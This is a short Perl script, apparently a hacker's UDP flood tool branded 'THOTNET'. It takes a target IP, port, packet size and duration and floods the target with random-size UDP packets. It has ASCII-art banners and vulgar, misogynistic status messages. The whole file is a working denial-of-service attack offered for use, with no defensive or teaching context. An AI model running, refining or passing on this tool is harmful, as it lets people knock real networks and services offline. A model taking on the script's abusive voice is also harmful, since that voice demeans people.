#!/usr/bin/perl

use Term::ANSIColor qw(:constants);
    $Term::ANSIColor::AUTORESET = 2;

print BOLD RED "          Coded by Craig Jones! [Monti#5989]\n";
print BOLD YELLOW "             |--------------------|\n";
print BOLD YELLOW "             |クレイグ・ジョーンズ|\n";
print BOLD YELLOW "             |--------------------|\n";
print BOLD BLACK "               трахни тебя, битриз.\n";

##
# Craig Jones <3 
##

use Socket;
use strict;

my ($ip,$port,$size,$time) = @ARGV;

my ($iaddr,$endtime,$psize,$pport);

$iaddr = inet_aton("$ip") or die "Cannot resolve hostname $ip\n";
$endtime = time() + ($time ? $time : 100);
socket(flood, PF_INET, SOCK_DGRAM, 17);

print BOLD GREEN<<EOTEXT;



████████╗██╗  ██╗ ██████╗ ████████╗███╗   ██╗███████╗████████╗
╚══██╔══╝██║  ██║██╔═══██╗╚══██╔══╝████╗  ██║██╔════╝╚══██╔══╝
   ██║   ███████║██║   ██║   ██║   ██╔██╗ ██║█████╗     ██║   
   ██║   ██╔══██║██║   ██║   ██║   ██║╚██╗██║██╔══╝     ██║   
   ██║   ██║  ██║╚██████╔╝   ██║   ██║ ╚████║███████╗   ██║   
   ╚═╝   ╚═╝  ╚═╝ ╚═════╝    ╚═╝   ╚═╝  ╚═══╝╚══════╝   ╚═╝   
                                                                                                                
	"Once a thot.... always a thot." -Kim Jong-un 
EOTEXT





print "Slamming that bitch ---> $ip " . ($port ? $port : "random") . " port with " . 
  ($size ? "$size-byte" : "random size") . " packets" . 
  ($time ? " for $time seconds" : "") . "\n";
print "Give the bitch a rest? [Ctrl +C]\n" unless $time;
 
for (;time() <= $endtime;) {
  $psize = $size ? $size : int(rand(1024-64)+64) ;
  $pport = $port ? $port : int(rand(65500))+1;
 
  send(flood, pack("a$psize","flood"), 0, pack_sockaddr_in($pport, $iaddr));}